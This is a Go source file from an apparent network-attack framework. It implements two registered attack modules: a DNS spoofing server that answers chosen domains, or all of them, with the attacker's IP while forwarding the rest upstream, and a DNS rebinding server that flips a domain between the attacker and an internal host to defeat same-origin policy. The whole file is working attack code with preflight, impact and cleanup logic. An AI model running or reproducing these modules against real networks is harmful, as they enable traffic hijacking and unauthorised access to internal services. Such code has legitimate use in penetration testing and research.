package mitm

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/netx/dns"
	"github.com/qyvora/toha3ee/internal/safety"
)

// init registers the DNS spoofing and DNS rebinding modules.
func init() {
	attacks.Register(&DNSSpoof{})
	attacks.Register(&DNSRebind{})
}

// DNSSpoof runs a spoof-capable DNS server on :53 with upstream forwarding.
type DNSSpoof struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*DNSSpoof) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:       "dns.spoof",
		Category: "mitm",
		Risk:     attacks.RiskMedium,
		Targets:  []string{"gateway", "host"},
		// Binding the privileged DNS port 53 (UDP and TCP) requires root.
		Requires:    []string{"cap.dns_bind"},
		Description: "spoof DNS answers for targeted domains while forwarding everything else upstream",
		Limitations: "clients using DNS-over-HTTPS/TLS (port 853) bypass this; no effect unless the victim's DNS traffic is already hijacked by arp.spoof",
	}
}

// dnsSpoofState is the per-run state stored in the AttackCtx; it holds the
// running DNS server so Verify and Cleanup can reach it.
type dnsSpoofState struct {
	srv *dns.Server
}

// Preflight warns if the network isn't already poisoned.
func (*DNSSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err != nil {
		rep.AddBlocked("root", err.Error())
	} else {
		rep.AddOK("root", "can bind UDP/TCP 53")
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())

	// Without at least one spoof rule the server would be a pure forwarder;
	// flag that so the operator knows the attack will not spoof anything.
	all := ctx.Conf.GetBool("dns.spoof", "all", false)
	domains := splitCSV(ctx.Conf.Get("dns.spoof", "domains"))
	if !all && len(domains) == 0 {
		rep.AddFixable("domains", "no domains configured (dns.spoof.domains) and dns.spoof.all=false; server would only forward")
	} else {
		rep.AddOK("domains", fmt.Sprintf("%d domain pattern(s), all=%v", len(domains), all))
	}
	return rep, nil
}

// Run starts the DNS server and blocks until ctx.Done.
func (m *DNSSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	all := ctx.Conf.GetBool("dns.spoof", "all", false)
	// The target IP is what spoofed domains resolve to; it defaults to this
	// host so victims' connections come back to us.
	target := net.ParseIP(ctx.Conf.GetDefault("dns.spoof", "target", ctx.Iface.IP.String()))
	if target == nil {
		return fmt.Errorf("dns.spoof: bad target ip")
	}

	server := dns.New(ctx.Conf.Get("dns.spoof", "upstream"), ctx.Bus, ctx.Store, nil)
	if all {
		// Catch-all mode: every query is answered with the target IP.
		server.AddRule("*", target)
	} else {
		// Selective mode: only the configured domains are hijacked; everything
		// else is forwarded to the upstream resolver untouched.
		for _, d := range splitCSV(ctx.Conf.Get("dns.spoof", "domains")) {
			server.AddRule(d, target)
		}
	}

	// Bind on the interface's IP so only hijacked DNS traffic lands here.
	if err := server.Start([]string{ctx.Iface.IP.String() + ":53"}); err != nil {
		return fmt.Errorf("dns.spoof: %w", err)
	}

	ctx.SetState("dns.spoof", &dnsSpoofState{srv: server})
	ctx.Safety.RegisterCleanup("dns.spoof", "stop DNS spoof server", func() error {
		server.Stop()
		ctx.Store.LogEvent(events.TopicModuleStopped, "dns.spoof stopped")
		return nil
	})

	if all {
		ctx.Printf("[*] dns.spoof: answering ALL queries with %s; non-spoofed traffic forwarded upstream.\n", target)
	} else {
		ctx.Printf("[*] dns.spoof: %d pattern(s) -> %s.\n", len(splitCSV(ctx.Conf.Get("dns.spoof", "domains"))), target)
	}

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("dns.spoof", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports DNS server counters.
func (*DNSSpoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("dns.spoof")
	if !ok {
		return nil, fmt.Errorf("dns.spoof not running")
	}
	srv := v.(*dnsSpoofState).srv
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("DNS server handled %d queries, spoofed %d", srv.Queries.Get(), srv.SpoofedCount.Get()),
	}
	imp.Add("queries", fmt.Sprintf("%d", srv.Queries.Get()))
	imp.Add("spoofed", fmt.Sprintf("%d", srv.SpoofedCount.Get()))
	imp.Add("rules", fmt.Sprintf("%d", len(srv.Rules())))
	return imp, nil
}

// Cleanup stops the server.
func (*DNSSpoof) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("dns.spoof")
	ctx.Safety.UnregisterCleanup("dns.spoof")
	if v, ok := ctx.GetState("dns.spoof"); ok {
		v.(*dnsSpoofState).srv.Stop()
	}
	return nil
}

// splitCSV splits a comma-separated list, trimming whitespace and dropping
// empty entries so configs like "a.com, b.com, " parse cleanly.
func splitCSV(s string) []string {
	var out []string
	for _, f := range strings.Split(s, ",") {
		if f = strings.TrimSpace(f); f != "" {
			out = append(out, f)
		}
	}
	return out
}

// DNSRebind runs a DNS server that alternates answers for a target domain
// between this host and the internal target's real IP. The victim first loads
// attacker content from the target hostname; the low TTL forces a re-lookup
// that then points the same origin at the internal service, defeating
// same-origin policy without the victim noticing a hostname change.
type DNSRebind struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*DNSRebind) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "dns.rebind",
		Category:    "mitm",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"host", "service"},
		Requires:    []string{"cap.dns_bind"},
		Description: "DNS rebinding: alternate answers for a domain between this host and the internal target to bypass same-origin policy",
		Limitations: "browsers that resolve once per page load may not re-query fast enough; HTTPS origins with preloaded HSTS are unaffected",
	}
}

// Preflight checks for root, an interface and the configured domain/target.
func (*DNSRebind) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err != nil {
		rep.AddBlocked("root", err.Error())
	} else {
		rep.AddOK("root", "can bind UDP/TCP 53")
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())
	rep.AddFixable("domains", "set dns.rebind.domains (comma-separated) and dns.rebind.target_ip to the internal service address")
	return rep, nil
}

// Run starts the alternating-answer DNS server and serves until stopped.
func (*DNSRebind) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	domains := splitCSV(ctx.Conf.Get("dns.rebind", "domains"))
	if len(domains) == 0 {
		return fmt.Errorf("dns.rebind: set dns.rebind.domains (comma-separated)")
	}
	targetStr := ctx.Conf.GetDefault("dns.rebind", "target_ip", "")
	if targetStr == "" {
		return fmt.Errorf("dns.rebind: set dns.rebind.target_ip to the internal service address")
	}
	target := net.ParseIP(targetStr)
	if target == nil {
		return fmt.Errorf("dns.rebind: bad target ip %q", targetStr)
	}
	if ctx.Iface == nil {
		return fmt.Errorf("dns.rebind: no interface configured")
	}

	server := dns.New(ctx.Conf.Get("dns.rebind", "upstream"), ctx.Bus, ctx.Store, nil)
	for _, d := range domains {
		// Each domain alternates between this host's IP and the internal
		// target, so consecutive queries flip the resolved address.
		server.AddRebind(d, ctx.Iface.IP, target)
	}
	if err := server.Start([]string{ctx.Iface.IP.String() + ":53"}); err != nil {
		return fmt.Errorf("dns.rebind: %w", err)
	}
	ctx.SetState("dns.rebind", &dnsSpoofState{srv: server})
	ctx.Safety.RegisterCleanup("dns.rebind", "stop DNS rebind server", func() error {
		server.Stop()
		return nil
	})
	ctx.Printf("[*] dns.rebind alternating %v between %s and %s.\n", domains, ctx.Iface.IP, target)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("dns.rebind", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports DNS query and rebinding-answer counters from the server.
func (*DNSRebind) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("dns.rebind")
	if !ok {
		return nil, fmt.Errorf("dns.rebind not running")
	}
	srv := v.(*dnsSpoofState).srv
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("DNS server handled %d queries; %d rebinding answers served", srv.Queries.Get(), srv.ReboundCount.Get()),
	}
	imp.Add("queries", fmt.Sprintf("%d", srv.Queries.Get()))
	imp.Add("rebound", fmt.Sprintf("%d", srv.ReboundCount.Get()))
	return imp, nil
}

// Cleanup stops the DNS server and unregisters its lifecycle hooks.
func (*DNSRebind) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("dns.rebind")
	ctx.Safety.UnregisterCleanup("dns.rebind")
	if v, ok := ctx.GetState("dns.rebind"); ok {
		v.(*dnsSpoofState).srv.Stop()
	}
	return nil
}

// Compile-time assertions that both DNS modules implement attacks.Module.
var _ attacks.Module = (*DNSRebind)(nil)

var _ attacks.Module = (*DNSSpoof)(nil)
